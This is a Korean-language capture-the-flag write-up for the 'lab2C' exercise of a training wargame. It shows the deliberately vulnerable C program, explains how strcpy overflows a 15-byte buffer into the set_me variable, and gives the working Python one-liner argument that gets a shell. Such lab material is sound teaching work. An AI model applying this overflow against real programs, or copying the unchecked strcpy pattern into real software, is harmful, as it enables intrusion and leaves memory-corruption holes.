## 1. 문제 확인
- ID : lab2C
- Target : /level/lab02/lab2C
- flag : /home/lab2B/.pass
```
	lab2C@warzone:/levels/lab02$ ./lab2C
	usage:
	./lab2C string
	lab2C@warzone:/levels/lab02$ ./lab2C g4nzzi
	Not authenticated.
	set_me was 0
	lab2C@warzone:/levels/lab02$
```

<br/><br/>
## 2. 취약점 분석
### 2.1 Source Code
```c
	#include <stdlib.h>
	#include <stdio.h>
	#include <string.h>

	/*
 	* compiled with:
 	* gcc -O0 -fno-stack-protector lab2C.c -o lab2C
 	*/

	void shell()
	{
    	printf("You did it.\n");
        system("/bin/sh");
	}

	int main(int argc, char** argv)
	{
        if(argc != 2)
        {
            printf("usage:\n%s string\n", argv[0]);
            return EXIT_FAILURE;
        }

        int set_me = 0;
        char buf[15];
        strcpy(buf, argv[1]);

        if(set_me == 0xdeadbeef)
        {
            shell();
        }
        else
        {
            printf("Not authenticated.\nset_me was %d\n", set_me);
        }

        return EXIT_SUCCESS;
	}
```
### 2.2 Code 분석
- strcpy()함수로 실행 인자(argv[1])값을 buf에 복사할 때 overflow 취약점 존재
```c
	strcpy(buf, argv[1]);
```
- set_me 값이 0xdeadbeef와 같으면 shell() 함수를 호출함
```c
	if(set_me == 0xdeadbeef)
	{
		shell();
    }
```

<br/><br/>
## 3. Exploit
- main()함수의 stack은 buf(15byte) + set_me(4byte) 형태임
```
	[XXXXXXXXXXXXXXX][ZZZZ][SFP][RET]
 	       buf       set_me
  	    (15byte)     (4byte)
```
- 실행 인자(argv[1])값으로 임의값(15byte) + 0xdeadbeef(4byte)을 입력하면 쉘 획득
```
	lab2C@warzone:/levels/lab02$ ./lab2C $(python -c 'print "a"*15 + "\xef\xbe\xad\xde"')
	You did it.
	$
```
